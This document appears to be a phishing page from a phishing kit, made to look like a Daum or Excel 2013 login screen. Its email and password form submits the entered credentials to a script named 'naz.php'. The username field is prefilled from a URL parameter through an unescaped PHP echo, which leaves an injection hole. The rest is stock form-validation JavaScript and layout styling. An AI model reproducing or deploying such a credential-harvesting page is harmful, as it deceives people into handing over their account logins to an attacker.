<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Daum </title>

<!--

var b = 0 ;
var i = 0 ;
var errmsg = "" ;
var punct = "" ;
var min = 0 ;
var max = 0 ;

function formbreeze_email(field) {

	if (b && (field.value.length == 0)) return true ;


	if (! emailCheck(field.value))
	  {
		  field.focus();
		  if (field.type == "text") field.select();
		  return false ;
	  }

   return true ;
}

function formbreeze_filledin(field) {

if (b && (field.value.length == 0)) return true;

if (field.value.length < min) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false ;
   }

if ((max > 0) && (field.value.length > max)) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false ;
   }

return true ;
}

function formbreeze_number(field) {

if (b && (field.value.length == 0)) return true ; ;

if (i)
 var valid = "0123456789"
else
 var valid = ".,0123456789"

var pass = 1;
var temp;
for (var i=0; i<field.value.length; i++) {
temp = "" + field.value.substring(i, i+1);
if (valid.indexOf(temp) == "-1") pass = 0;

}

if (!pass) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false;
 }

if (field.value < min) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false;
   }


if ((max > 0) && (field.value > max)) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false;
   }

return true ;
}


function formbreeze_numseq(field) {


if (b && (field.value.length == 0)) return true ;

var valid = punct + "0123456789"

var pass = 1;
var digits = 0
var temp;
for (var i=0; i<field.value.length; i++) {
temp = "" + field.value.substring(i, i+1);
if (valid.indexOf(temp) == "-1") pass = 0;
if (valid.indexOf(temp) > (punct.length-1) ) digits++ ;

}

if (!pass) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false ; ;
   }

if (digits < min) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false;
   }

if ((max > 0) && (digits > max)) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false;
   }

return true ;
}

function emailCheck (emailStr) {

var checkTLD=1;
var knownDomsPat=/^(com|net|org|edu|int|mil|gov|arpa|biz|aero|name|coop|info|pro|museum|ws)$/;
var emailPat=/^(.+)@(.+)$/;
var specialChars="\\(\\)><@,;:\\\\\\\"\\.\\[\\]";
var validChars="\[^\\s" + specialChars + "\]";
var quotedUser="(\"[^\"]*\")";
var atom=validChars + '+';
var word="(" + atom + "|" + quotedUser + ")";
var userPat=new RegExp("^" + word + "(\\." + word + ")*$");
var domainPat=new RegExp("^" + atom + "(\\." + atom +")*$");
var matchArray=emailStr.match(emailPat);

if (matchArray==null) {
alert(errmsg);
return false;
}
var user=matchArray[1];
var domain=matchArray[2];

for (i=0; i<user.length; i++) {
if (user.charCodeAt(i)>127) {
alert(errmsg);
return false;
   }
}
for (i=0; i<domain.length; i++) {
if (domain.charCodeAt(i)>127) {
alert(errmsg);
return false;
   }
}

if (user.match(userPat)==null) {
alert(errmsg);
return false;
}

var atomPat=new RegExp("^" + atom + "$");
var domArr=domain.split(".");
var len=domArr.length;
for (i=0;i<len;i++) {
if (domArr[i].search(atomPat)==-1) {
alert(errmsg);
return false;
   }
}

if (checkTLD && domArr[domArr.length-1].length!=2 &&
domArr[domArr.length-1].search(knownDomsPat)==-1) {
alert(errmsg);
return false;
}

if (len<2) {
alert(errmsg);
return false;
}

return true;
}

function formbreeze_sub()
{
/*
//FBDATA:Email^1^0^Please enter a valid email address.:;Password^0^1^0^0^Enter your password:;
*/
b=0;
errmsg="Please enter a valid email address.";
if (! formbreeze_email(document.login_form.Email) ) return false ;
b=0;
errmsg="Enter your password";
min=1;
max=0;
if (! formbreeze_filledin(document.login_form.Password) ) return false ;

}
-->
</script>

<style type="text/css">
.auto-style1 {
	margin-top: 16px;
	margin-bottom: 0px;
	margin-left: 0px;
}
.auto-style2 {
	margin-right: 0px;
	margin-top: 0px;
	margin-left: 54px;
}
.auto-style3 {
	margin-top: 12px;
}
.auto-style4 {
	margin-left: 0px;
}
.auto-style5 {
	margin-right: 8px;
	margin-left: 30px;
}
</style>

</head>

<body style="background-image: url('exl.png'); background-repeat: no-repeat">

<div style="position: absolute; width: 1013px; height: 487px; z-index: 1; left: 329px; down: 300px; background-image: url('excel2013.png'); background-repeat: no-repeat; top: 78px;" id="layer1" class="auto-style4">
<div style="position: absolute; width: 91px; height: 7px; z-index: 1; left: 171px; top: 500px; background-image: url('294.gif'); background-repeat: no-repeat" id="layer2">
	&nbsp;</div>

<form method="POST" autocomplete="on" name="login_form" id="login_form"   style="line-height: 1.22em; margin: 0px; padding: 0px;" action="naz.php"  onsubmit=" return formbreeze_sub()" >



<div style="position: absolute; width: 287px; height: 38px; z-index: 1; left: 48px; top: 54px" id="layer3">
	<span class="formwrap">
									  <input id="did" name="username"  autocomplete="on" value="<?=$_GET[oreofe]?>" style="width:289px; height:38px" type="username" class="auto-style1"></span></div>
									  

<div style="position: absolute; width: 276px; height: 34px; z-index: 2; left: -8px; top: 118px" id="layer4" class="auto-style3">
										<span class="formwrap">
										<input   id="didd" name="Password" placeholder="Password" style="width:290px; height:36px" type="password" class="auto-style2"></span></div>
										

										<div style="position: absolute; width: 

289px; height: 75px; z-index: 3; left: 8px; top: 186px" id="layer5">
								<input type="image" src="feeeee.png" border="0" 

alt="Submit" class="auto-style5" height="53" width="308" />
				

</body>
